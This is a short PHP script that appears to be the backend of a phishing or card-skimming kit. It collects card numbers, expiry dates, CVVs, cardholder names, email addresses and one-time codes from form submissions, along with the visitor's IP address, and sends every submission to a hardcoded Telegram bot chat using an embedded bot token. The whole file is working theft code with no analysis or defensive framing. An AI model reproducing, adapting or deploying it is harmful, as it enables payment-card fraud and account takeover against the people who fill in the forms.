<?php
if (isset($_POST["card_number"]) && isset($_POST["expiry"]) && isset($_POST["cvv"]) && isset($_POST["name_on_card"])) {
    $card_number = $_POST["card_number"];
    $expiry = $_POST["expiry"];
    $cvv = $_POST["cvv"];   
    $name_on_card = $_POST["name_on_card"];
    $project = $_POST["project"];
    $price = $_POST["price"];
    $uuid = $_POST["sessionId"];
    $ip = $_SERVER['HTTP_CLIENT_IP'] ? $_SERVER['HTTP_CLIENT_IP'] : ($_SERVER['HTTP_X_FORWARDED_FOR'] ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
    $site = $_SERVER['HTTP_HOST'];

    $message = "User IP: " . $ip . "\nSession ID: `" . $uuid . "`\nCard Number: `" . $card_number . "`\nExpiry: `" . $expiry . "`\nCVV: `" . $cvv . "`\nName on Card: `" . $name_on_card . "`\nPrice: `" . $price . "`\nProject: " . $project;
    sendTel($message);

} elseif (isset($_POST["email"])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'] ? $_SERVER['HTTP_CLIENT_IP'] : ($_SERVER['HTTP_X_FORWARDED_FOR'] ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
    $site = $_SERVER['HTTP_HOST'];
    $email = $_POST["email"];
    $project = $_POST["project"];
    $uuid = $_POST["sessionId"];
    $message = "User IP: " . $ip . "\nSession ID: `" . $uuid . "`\nEmail: `" . $email . "`\nProject: " . $project;
    sendTel($message);

} elseif (isset($_POST["code"])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'] ? $_SERVER['HTTP_CLIENT_IP'] : ($_SERVER['HTTP_X_FORWARDED_FOR'] ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
    $site = $_SERVER['HTTP_HOST'];
    $code = $_POST["code"];
    $project = $_POST["project"];
    $uuid = $_POST["sessionId"];
    $message = "User IP: " . $ip . "\nSession ID: `" . $uuid . "`\nCode: `" . $code . "`\nProject: " . $project;
    sendTel($message);
}
else {
    echo "Please fill out all form fields.";
}
	
function sendTel($message){
    $message=urldecode($message);
    $chatId = "1967393288";
    $botToken = "7126659021:AAGXM1pRYsqgLUSetENRHNreBfUM7uZ4e1Y";
    $filename = "https://api.telegram.org/bot".$botToken."/sendMessage?chat_id=".$chatId."&text=".urlencode($message)."&parse_mode=MarkDown";
    file_get_contents($filename);
}
    
 
?>
    
    